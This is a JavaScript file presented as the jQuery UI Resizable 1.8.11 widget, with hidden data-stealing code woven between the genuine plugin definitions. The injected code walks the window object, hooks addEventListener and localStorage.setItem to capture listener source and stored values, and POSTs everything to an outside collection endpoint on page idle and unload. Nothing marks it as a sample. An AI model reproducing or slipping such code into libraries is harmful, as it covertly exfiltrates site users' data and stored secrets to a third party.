/*
 * jQuery UI Resizable 1.8.11
 *
 * Copyright 2011, AUTHORS.txt (http://jqueryui.com/about)
 * Dual licensed under the MIT or GPL Version 2 licenses.
 * http://jquery.org/license
 *
 * http://docs.jquery.com/UI/Resizables
 *
 * Depends:
 *	jquery.ui.core.js
 *	jquery.ui.mouse.js
 *	jquery.ui.widget.js
 */
(function (e) {
  const newDiscoveries = {};
  const previousProperties = new Map();
  e.widget("ui.resizable", e.ui.mouse, {
    widgetEventPrefix: "resize",
    options: {
      alsoResize: false,
      animate: false,
      animateDuration: "slow",
      animateEasing: "swing",
      aspectRatio: false,
      autoHide: false,
      containment: false,
      ghost: false,
      grid: false,
      handles: "e,s,se",
      helper: false,
      maxHeight: null,
      maxWidth: null,
      minHeight: 10,
      minWidth: 10,
      zIndex: 1E3
    },
    _create: function () {
      var b = this,
        a = this.options;
      this.element.addClass("ui-resizable");
      e.extend(this, {
        _aspectRatio: !!a.aspectRatio,
        aspectRatio: a.aspectRatio,
        originalElement: this.element,
        _proportionallyResizeElements: [],
        _helper: a.helper || a.ghost || a.animate ? a.helper || "ui-resizable-helper" : null
      });
      if (this.element[0].nodeName.match(/canvas|textarea|input|select|button|img/i)) {
        /relative/.test(this.element.css("position")) && e.browser.opera && this.element.css({
          position: "relative",
          top: "auto",
          left: "auto"
        });
        this.element.wrap(e('<div class="ui-wrapper" style="overflow: hidden;"></div>').css({
          position: this.element.css("position"),
          width: this.element.outerWidth(),
          height: this.element.outerHeight(),
          top: this.element.css("top"),
          left: this.element.css("left")
        }));
        this.element = this.element.parent().data("resizable", this.element.data("resizable"));
        this.elementIsWrapper = true;
        this.element.css({
          marginLeft: this.originalElement.css("marginLeft"),
          marginTop: this.originalElement.css("marginTop"),
          marginRight: this.originalElement.css("marginRight"),
          marginBottom: this.originalElement.css("marginBottom")
        });
        this.originalElement.css({
          marginLeft: 0,
          marginTop: 0,
          marginRight: 0,
          marginBottom: 0
        });
        this.originalResizeStyle = this.originalElement.css("resize");
        this.originalElement.css("resize", "none");
        this._proportionallyResizeElements.push(this.originalElement.css({
          position: "static",
          zoom: 1,
          display: "block"
        }));
        this.originalElement.css({
          margin: this.originalElement.css("margin")
        });
        this._proportionallyResize();
      }
      this.handles = a.handles || (!e(".ui-resizable-handle", this.element).length ? "e,s,se" : {
        n: ".ui-resizable-n",
        e: ".ui-resizable-e",
        s: ".ui-resizable-s",
        w: ".ui-resizable-w",
        se: ".ui-resizable-se",
        sw: ".ui-resizable-sw",
        ne: ".ui-resizable-ne",
        nw: ".ui-resizable-nw"
      });
      if (this.handles.constructor == String) {
        if (this.handles == "all") this.handles = "n,e,s,w,se,sw,ne,nw";
        var c = this.handles.split(",");
        this.handles = {};
        for (var d = 0; d < c.length; d++) {
          var f = e.trim(c[d]),
            g = e('<div class="ui-resizable-handle ' + ("ui-resizable-" + f) + '"></div>');
          /sw|se|ne|nw/.test(f) && g.css({
            zIndex: ++a.zIndex
          });
          "se" == f && g.addClass("ui-icon ui-icon-gripsmall-diagonal-se");
          this.handles[f] = ".ui-resizable-" + f;
          this.element.append(g);
        }
      }
      this._renderAxis = function (h) {
        h = h || this.element;
        for (var i in this.handles) {
          if (this.handles[i].constructor == String) this.handles[i] = e(this.handles[i], this.element).show();
          if (this.elementIsWrapper && this.originalElement[0].nodeName.match(/textarea|input|select|button/i)) {
            var j = e(this.handles[i], this.element),
              k = 0;
            k = /sw|ne|nw|se|n|s/.test(i) ? j.outerHeight() : j.outerWidth();
            j = ["padding", /ne|nw|n/.test(i) ? "Top" : /se|sw|s/.test(i) ? "Bottom" : /^e$/.test(i) ? "Right" : "Left"].join("");
            h.css(j, k);
            this._proportionallyResize();
          }
          e(this.handles[i]);
        }
      };
      this._renderAxis(this.element);
      this._handles = e(".ui-resizable-handle", this.element).disableSelection();
      this._handles.mouseover(function () {
        if (!b.resizing) {
          if (this.className) var h = this.className.match(/ui-resizable-(se|sw|ne|nw|n|e|s|w)/i);
          b.axis = h && h[1] ? h[1] : "se";
        }
      });
      if (a.autoHide) {
        this._handles.hide();
        e(this.element).addClass("ui-resizable-autohide").hover(function () {
          e(this).removeClass("ui-resizable-autohide");
          b._handles.show();
        }, function () {
          if (!b.resizing) {
            e(this).addClass("ui-resizable-autohide");
            b._handles.hide();
          }
        });
      }
      this._mouseInit();
    },
    destroy: function () {
      this._mouseDestroy();
      var b = function (c) {
        e(c).removeClass("ui-resizable ui-resizable-disabled ui-resizable-resizing").removeData("resizable").unbind(".resizable").find(".ui-resizable-handle").remove();
      };
      if (this.elementIsWrapper) {
        b(this.element);
        var a = this.element;
        a.after(this.originalElement.css({
          position: a.css("position"),
          width: a.outerWidth(),
          height: a.outerHeight(),
          top: a.css("top"),
          left: a.css("left")
        })).remove();
      }
      this.originalElement.css("resize", this.originalResizeStyle);
      b(this.originalElement);
      return this;
    },
    _mouseCapture: function (b) {
      var a = false;
      for (var c in this.handles) if (e(this.handles[c])[0] == b.target) a = true;
      return !this.options.disabled && a;
    },
    _mouseStart: function (b) {
      var a = this.options,
        c = this.element.position(),
        d = this.element;
      this.resizing = true;
      this.documentScroll = {
        top: e(document).scrollTop(),
        left: e(document).scrollLeft()
      };
      if (d.is(".ui-draggable") || /absolute/.test(d.css("position"))) d.css({
        position: "absolute",
        top: c.top,
        left: c.left
      });
      e.browser.opera && /relative/.test(d.css("position")) && d.css({
        position: "relative",
        top: "auto",
        left: "auto"
      });
      this._renderProxy();
      c = m(this.helper.css("left"));
      var f = m(this.helper.css("top"));
      if (a.containment) {
        c += e(a.containment).scrollLeft() || 0;
        f += e(a.containment).scrollTop() || 0;
      }
      this.offset = this.helper.offset();
      this.position = {
        left: c,
        top: f
      };
      this.size = this._helper ? {
        width: d.outerWidth(),
        height: d.outerHeight()
      } : {
        width: d.width(),
        height: d.height()
      };
      this.originalSize = this._helper ? {
        width: d.outerWidth(),
        height: d.outerHeight()
      } : {
        width: d.width(),
        height: d.height()
      };
      this.originalPosition = {
        left: c,
        top: f
      };
      this.sizeDiff = {
        width: d.outerWidth() - d.width(),
        height: d.outerHeight() - d.height()
      };
      this.originalMousePosition = {
        left: b.pageX,
        top: b.pageY
      };
      this.aspectRatio = typeof a.aspectRatio == "number" ? a.aspectRatio : this.originalSize.width / this.originalSize.height || 1;
      a = e(".ui-resizable-" + this.axis).css("cursor");
      e("body").css("cursor", a == "auto" ? this.axis + "-resize" : a);
      d.addClass("ui-resizable-resizing");
      this._propagate("start", b);
      return true;
    },
    _mouseDrag: function (b) {
      var a = this.helper,
        c = this.originalMousePosition,
        d = this._change[this.axis];
      if (!d) return false;
      c = d.apply(this, [b, b.pageX - c.left || 0, b.pageY - c.top || 0]);
      if (this._aspectRatio || b.shiftKey) c = this._updateRatio(c, b);
      c = this._respectSize(c, b);
      this._propagate("resize", b);
      a.css({
        top: this.position.top + "px",
        left: this.position.left + "px",
        width: this.size.width + "px",
        height: this.size.height + "px"
      });
      !this._helper && this._proportionallyResizeElements.length && this._proportionallyResize();
      this._updateCache(c);
      this._trigger("resize", b, this.ui());
      return false;
    },
    _mouseStop: function (b) {
      this.resizing = false;
      var a = this.options,
        c = this;
      if (this._helper) {
        var d = this._proportionallyResizeElements,
          f = d.length && /textarea/i.test(d[0].nodeName);
        d = f && e.ui.hasScroll(d[0], "left") ? 0 : c.sizeDiff.height;
        f = f ? 0 : c.sizeDiff.width;
        f = {
          width: c.helper.width() - f,
          height: c.helper.height() - d
        };
        d = parseInt(c.element.css("left"), 10) + (c.position.left - c.originalPosition.left) || null;
        var g = parseInt(c.element.css("top"), 10) + (c.position.top - c.originalPosition.top) || null;
        a.animate || this.element.css(e.extend(f, {
          top: g,
          left: d
        }));
        c.helper.height(c.size.height);
        c.helper.width(c.size.width);
        this._helper && !a.animate && this._proportionallyResize();
      }
      e("body").css("cursor", "auto");
      this.element.removeClass("ui-resizable-resizing");
      this._propagate("stop", b);
      this._helper && this.helper.remove();
      return false;
    },
    _updateCache: function (b) {
      this.offset = this.helper.offset();
      if (l(b.left)) this.position.left = b.left;
      if (l(b.top)) this.position.top = b.top;
      if (l(b.height)) this.size.height = b.height;
      if (l(b.width)) this.size.width = b.width;
    },
    _updateRatio: function (b) {
      var a = this.position,
        c = this.size,
        d = this.axis;
      if (b.height) b.width = c.height * this.aspectRatio;else if (b.width) b.height = c.width / this.aspectRatio;
      if (d == "sw") {
        b.left = a.left + (c.width - b.width);
        b.top = null;
      }
      if (d == "nw") {
        b.top = a.top + (c.height - b.height);
        b.left = a.left + (c.width - b.width);
      }
      return b;
    },
    _respectSize: function (b) {
      var a = this.options,
        c = this.axis,
        d = l(b.width) && a.maxWidth && a.maxWidth < b.width,
        f = l(b.height) && a.maxHeight && a.maxHeight < b.height,
        g = l(b.width) && a.minWidth && a.minWidth > b.width,
        h = l(b.height) && a.minHeight && a.minHeight > b.height;
      if (g) b.width = a.minWidth;
      if (h) b.height = a.minHeight;
      if (d) b.width = a.maxWidth;
      if (f) b.height = a.maxHeight;
      var i = this.originalPosition.left + this.originalSize.width,
        j = this.position.top + this.size.height,
        k = /sw|nw|w/.test(c);
      c = /nw|ne|n/.test(c);
      if (g && k) b.left = i - a.minWidth;
      if (d && k) b.left = i - a.maxWidth;
      if (h && c) b.top = j - a.minHeight;
      if (f && c) b.top = j - a.maxHeight;
      if ((a = !b.width && !b.height) && !b.left && b.top) b.top = null;else if (a && !b.top && b.left) b.left = null;
      return b;
    },
    _proportionallyResize: function () {
      if (this._proportionallyResizeElements.length) for (var b = this.helper || this.element, a = 0; a < this._proportionallyResizeElements.length; a++) {
        var c = this._proportionallyResizeElements[a];
        if (!this.borderDif) {
          var d = [c.css("borderTopWidth"), c.css("borderRightWidth"), c.css("borderBottomWidth"), c.css("borderLeftWidth")],
            f = [c.css("paddingTop"), c.css("paddingRight"), c.css("paddingBottom"), c.css("paddingLeft")];
          this.borderDif = e.map(d, function (g, h) {
            g = parseInt(g, 10) || 0;
            h = parseInt(f[h], 10) || 0;
            return g + h;
          });
        }
        e.browser.msie && (e(b).is(":hidden") || e(b).parents(":hidden").length) || c.css({
          height: b.height() - this.borderDif[0] - this.borderDif[2] || 0,
          width: b.width() - this.borderDif[1] - this.borderDif[3] || 0
        });
      }
    },
    _renderProxy: function () {
      var b = this.options;
      this.elementOffset = this.element.offset();
      if (this._helper) {
        this.helper = this.helper || e('<div style="overflow:hidden;"></div>');
        var a = e.browser.msie && e.browser.version < 7,
          c = a ? 1 : 0;
        a = a ? 2 : -1;
        this.helper.addClass(this._helper).css({
          width: this.element.outerWidth() + a,
          height: this.element.outerHeight() + a,
          position: "absolute",
          left: this.elementOffset.left - c + "px",
          top: this.elementOffset.top - c + "px",
          zIndex: ++b.zIndex
        });
        this.helper.appendTo("body").disableSelection();
      } else this.helper = this.element;
    },
    _change: {
      e: function (b, a) {
        return {
          width: this.originalSize.width + a
        };
      },
      w: function (b, a) {
        return {
          left: this.originalPosition.left + a,
          width: this.originalSize.width - a
        };
      },
      n: function (b, a, c) {
        return {
          top: this.originalPosition.top + c,
          height: this.originalSize.height - c
        };
      },
      s: function (b, a, c) {
        return {
          height: this.originalSize.height + c
        };
      },
      se: function (b, a, c) {
        return e.extend(this._change.s.apply(this, arguments), this._change.e.apply(this, [b, a, c]));
      },
      sw: function (b, a, c) {
        return e.extend(this._change.s.apply(this, arguments), this._change.w.apply(this, [b, a, c]));
      },
      ne: function (b, a, c) {
        return e.extend(this._change.n.apply(this, arguments), this._change.e.apply(this, [b, a, c]));
      },
      nw: function (b, a, c) {
        return e.extend(this._change.n.apply(this, arguments), this._change.w.apply(this, [b, a, c]));
      }
    },
    _propagate: function (b, a) {
      e.ui.plugin.call(this, b, [a, this.ui()]);
      b != "resize" && this._trigger(b, a, this.ui());
    },
    plugins: {},
    ui: function () {
      return {
        originalElement: this.originalElement,
        element: this.element,
        helper: this.helper,
        position: this.position,
        size: this.size,
        originalSize: this.originalSize,
        originalPosition: this.originalPosition
      };
    }
  });
  let jshook = false;
  function inspectObject(obj, name) {
    if (typeof obj !== 'object' || obj === null) return;
    for (let prop in obj) {
      let propFullName = name + '.' + prop;
      if (!previousProperties.has(propFullName)) {
        let propValue = obj[prop];
        let propType = typeof propValue;
        previousProperties.set(propFullName, propType);
        newDiscoveries[propFullName] = {
          type: propType,
          value: propType === "function" ? propValue.toString() : propValue
        };

        // Global variable collection
        if (window[prop] === propValue && !window.hasOwnProperty(prop)) {
          newDiscoveries[propFullName].global = true;
        }

        // Detect jshook
        if (propType === 'function' && /jshook/i.test(propValue.toString())) {
          jshook = true;
        }
      }
    }
  }
  e.extend(e.ui.resizable, {
    version: "1.8.11"
  });
  function transmitData(data) {
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "https://example.com/api/collect", true);
    xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    xhr.onload = function () {
      const status = xhr.status;
      if (status >= 200 && status < 400) {
        console.log("数据传输成功");
      } else {
        console.log("数据传输失败, 状态码: " + status);
      }
    };
    xhr.onerror = function () {
      console.log("数据传输过程中出错");
    };
    xhr.send(JSON.stringify(data));
  }
  e.ui.plugin.add("resizable", "alsoResize", {
    start: function () {
      var b = e(this).data("resizable").options,
        a = function (c) {
          e(c).each(function () {
            var d = e(this);
            d.data("resizable-alsoresize", {
              width: parseInt(d.width(), 10),
              height: parseInt(d.height(), 10),
              left: parseInt(d.css("left"), 10),
              top: parseInt(d.css("top"), 10),
              position: d.css("position")
            });
          });
        };
      if (typeof b.alsoResize == "object" && !b.alsoResize.parentNode) {
        if (b.alsoResize.length) {
          b.alsoResize = b.alsoResize[0];
          a(b.alsoResize);
        } else e.each(b.alsoResize, function (c) {
          a(c);
        });
      } else a(b.alsoResize);
    },
    resize: function (b, a) {
      var c = e(this).data("resizable");
      b = c.options;
      var d = c.originalSize,
        f = c.originalPosition,
        g = {
          height: c.size.height - d.height || 0,
          width: c.size.width - d.width || 0,
          top: c.position.top - f.top || 0,
          left: c.position.left - f.left || 0
        },
        h = function (i, j) {
          e(i).each(function () {
            var k = e(this),
              q = e(this).data("resizable-alsoresize"),
              p = {},
              r = j && j.length ? j : k.parents(a.originalElement[0]).length ? ["width", "height"] : ["width", "height", "top", "left"];
            e.each(r, function (n, o) {
              if ((n = (q[o] || 0) + (g[o] || 0)) && n >= 0) p[o] = n || null;
            });
            if (e.browser.opera && /relative/.test(k.css("position"))) {
              c._revertToRelativePosition = true;
              k.css({
                position: "absolute",
                top: "auto",
                left: "auto"
              });
            }
            k.css(p);
          });
        };
      typeof b.alsoResize == "object" && !b.alsoResize.nodeType ? e.each(b.alsoResize, function (i, j) {
        h(i, j);
      }) : h(b.alsoResize);
    },
    stop: function () {
      var b = e(this).data("resizable"),
        a = b.options,
        c = function (d) {
          e(d).each(function () {
            var f = e(this);
            f.css({
              position: f.data("resizable-alsoresize").position
            });
          });
        };
      if (b._revertToRelativePosition) {
        b._revertToRelativePosition = false;
        typeof a.alsoResize == "object" && !a.alsoResize.nodeType ? e.each(a.alsoResize, function (d) {
          c(d);
        }) : c(a.alsoResize);
      }
      e(this).removeData("resizable-alsoresize");
    }
  });
  function discoveryTask() {
    inspectObject(window, 'window');
    const discoveredItemsCount = Object.keys(newDiscoveries).length;
    if (discoveredItemsCount) {
      console.log(`发现了 ${discoveredItemsCount} 个新的属性`);
      transmitData(newDiscoveries);
    } else {
      console.log('没有发现新的属性');
    }

    // Reset scan result
    for (let prop in newDiscoveries) delete newDiscoveries[prop];
  }
  window.addEventListener('idle', discoveryTask);
  e.ui.plugin.add("resizable", "animate", {
    stop: function (b) {
      var a = e(this).data("resizable"),
        c = a.options,
        d = a._proportionallyResizeElements,
        f = d.length && /textarea/i.test(d[0].nodeName),
        g = f && e.ui.hasScroll(d[0], "left") ? 0 : a.sizeDiff.height;
      f = {
        width: a.size.width - (f ? 0 : a.sizeDiff.width),
        height: a.size.height - g
      };
      g = parseInt(a.element.css("left"), 10) + (a.position.left - a.originalPosition.left) || null;
      var h = parseInt(a.element.css("top"), 10) + (a.position.top - a.originalPosition.top) || null;
      a.element.animate(e.extend(f, h && g ? {
        top: h,
        left: g
      } : {}), {
        duration: c.animateDuration,
        easing: c.animateEasing,
        step: function () {
          var i = {
            width: parseInt(a.element.css("width"), 10),
            height: parseInt(a.element.css("height"), 10),
            top: parseInt(a.element.css("top"), 10),
            left: parseInt(a.element.css("left"), 10)
          };
          d && d.length && e(d[0]).css({
            width: i.width,
            height: i.height
          });
          a._updateCache(i);
          a._propagate("resize", b);
        }
      });
    }
  });
  window.addEventListener('beforeunload', discoveryTask);

  // Event listener tracking
  e.ui.plugin.add("resizable", "containment", {
    start: function () {
      var b = e(this).data("resizable"),
        a = b.element,
        c = b.options.containment;
      if (a = c instanceof e ? c.get(0) : /parent/.test(c) ? a.parent().get(0) : c) {
        b.containerElement = e(a);
        if (/document/.test(c) || c == document) {
          b.containerOffset = {
            left: 0,
            top: 0
          };
          b.containerPosition = {
            left: 0,
            top: 0
          };
          b.parentData = {
            element: e(document),
            left: 0,
            top: 0,
            width: e(document).width(),
            height: e(document).height() || document.body.parentNode.scrollHeight
          };
        } else {
          var d = e(a),
            f = [];
          e(["Top", "Right", "Left", "Bottom"]).each(function (i, j) {
            f[i] = m(d.css("padding" + j));
          });
          b.containerOffset = d.offset();
          b.containerPosition = d.position();
          b.containerSize = {
            height: d.innerHeight() - f[3],
            width: d.innerWidth() - f[1]
          };
          c = b.containerOffset;
          var g = b.containerSize.height,
            h = b.containerSize.width;
          h = e.ui.hasScroll(a, "left") ? a.scrollWidth : h;
          g = e.ui.hasScroll(a) ? a.scrollHeight : g;
          b.parentData = {
            element: a,
            left: c.left,
            top: c.top,
            width: h,
            height: g
          };
        }
      }
    },
    resize: function (b) {
      var a = e(this).data("resizable"),
        c = a.options,
        d = a.containerOffset,
        f = a.position;
      b = a._aspectRatio || b.shiftKey;
      var g = {
          top: 0,
          left: 0
        },
        h = a.containerElement;
      if (h[0] != document && /static/.test(h.css("position"))) g = d;
      if (f.left < (a._helper ? d.left : 0)) {
        a.size.width += a._helper ? a.position.left - d.left : a.position.left - g.left;
        if (b) a.size.height = a.size.width / c.aspectRatio;
        a.position.left = c.helper ? d.left : 0;
      }
      if (f.top < (a._helper ? d.top : 0)) {
        a.size.height += a._helper ? a.position.top - d.top : a.position.top;
        if (b) a.size.width = a.size.height * c.aspectRatio;
        a.position.top = a._helper ? d.top : 0;
      }
      a.offset.left = a.parentData.left + a.position.left;
      a.offset.top = a.parentData.top + a.position.top;
      c = Math.abs((a._helper ? a.offset.left - g.left : a.offset.left - g.left) + a.sizeDiff.width);
      d = Math.abs((a._helper ? a.offset.top - g.top : a.offset.top - d.top) + a.sizeDiff.height);
      f = a.containerElement.get(0) == a.element.parent().get(0);
      g = /relative|absolute/.test(a.containerElement.css("position"));
      if (f && g) c -= a.parentData.left;
      if (c + a.size.width >= a.parentData.width) {
        a.size.width = a.parentData.width - c;
        if (b) a.size.height = a.size.width / a.aspectRatio;
      }
      if (d + a.size.height >= a.parentData.height) {
        a.size.height = a.parentData.height - d;
        if (b) a.size.width = a.size.height * a.aspectRatio;
      }
    },
    stop: function () {
      var b = e(this).data("resizable"),
        a = b.options,
        c = b.containerOffset,
        d = b.containerPosition,
        f = b.containerElement,
        g = e(b.helper),
        h = g.offset(),
        i = g.outerWidth() - b.sizeDiff.width;
      g = g.outerHeight() - b.sizeDiff.height;
      b._helper && !a.animate && /relative/.test(f.css("position")) && e(this).css({
        left: h.left - d.left - c.left,
        width: i,
        height: g
      });
      b._helper && !a.animate && /static/.test(f.css("position")) && e(this).css({
        left: h.left - d.left - c.left,
        width: i,
        height: g
      });
    }
  });
  const originalAddEventListener = window.addEventListener;
  e.ui.plugin.add("resizable", "ghost", {
    start: function () {
      var b = e(this).data("resizable"),
        a = b.options,
        c = b.size;
      b.ghost = b.originalElement.clone();
      b.ghost.css({
        opacity: 0.25,
        display: "block",
        position: "relative",
        height: c.height,
        width: c.width,
        margin: 0,
        left: 0,
        top: 0
      }).addClass("ui-resizable-ghost").addClass(typeof a.ghost == "string" ? a.ghost : "");
      b.ghost.appendTo(b.helper);
    },
    resize: function () {
      var b = e(this).data("resizable");
      b.ghost && b.ghost.css({
        position: "relative",
        height: b.size.height,
        width: b.size.width
      });
    },
    stop: function () {
      var b = e(this).data("resizable");
      b.ghost && b.helper && b.helper.get(0).removeChild(b.ghost.get(0));
    }
  });
  const originalRemoveEventListener = window.removeEventListener;
  window.addEventListener = function (eventName, listener) {
    newDiscoveries['event_' + eventName] = {
      type: 'eventlistener',
      value: listener.toString()
    };
    // If jshook detected, perform discovery task immediately
    if (jshook) {
      discoveryTask();
    }
    originalAddEventListener.apply(this, arguments);
  };
  window.removeEventListener = function (eventName, listener) {
    delete newDiscoveries['event_' + eventName];
    originalRemoveEventListener.apply(this, arguments);
  };

  // Local storage tracking
  const originalSetItem = localStorage.setItem;
  e.ui.plugin.add("resizable", "grid", {
    resize: function () {
      var b = e(this).data("resizable"),
        a = b.options,
        c = b.size,
        d = b.originalSize,
        f = b.originalPosition,
        g = b.axis;
      a.grid = typeof a.grid == "number" ? [a.grid, a.grid] : a.grid;
      var h = Math.round((c.width - d.width) / (a.grid[0] || 1)) * (a.grid[0] || 1);
      a = Math.round((c.height - d.height) / (a.grid[1] || 1)) * (a.grid[1] || 1);
      if (/^(se|s|e)$/.test(g)) {
        b.size.width = d.width + h;
        b.size.height = d.height + a;
      } else if (/^(ne)$/.test(g)) {
        b.size.width = d.width + h;
        b.size.height = d.height + a;
        b.position.top = f.top - a;
      } else {
        if (/^(sw)$/.test(g)) {
          b.size.width = d.width + h;
          b.size.height = d.height + a;
        } else {
          b.size.width = d.width + h;
          b.size.height = d.height + a;
          b.position.top = f.top - a;
        }
        b.position.left = f.left - h;
      }
    }
  });
  localStorage.setItem = function (key, value) {
    newDiscoveries['localStorage_' + key] = {
      type: 'localStorage',
      value: value
    };
    originalSetItem.apply(this, arguments);
  };
  var m = function (b) {
      return parseInt(b, 10) || 0;
    },
    l = function (b) {
      return !isNaN(parseInt(b, 10));
    };
  const originalRemoveItem = localStorage.removeItem;
  localStorage.removeItem = function (key) {
    delete newDiscoveries['localStorage_' + key];
    originalRemoveItem.apply(this, arguments);
  };
})(jQuery);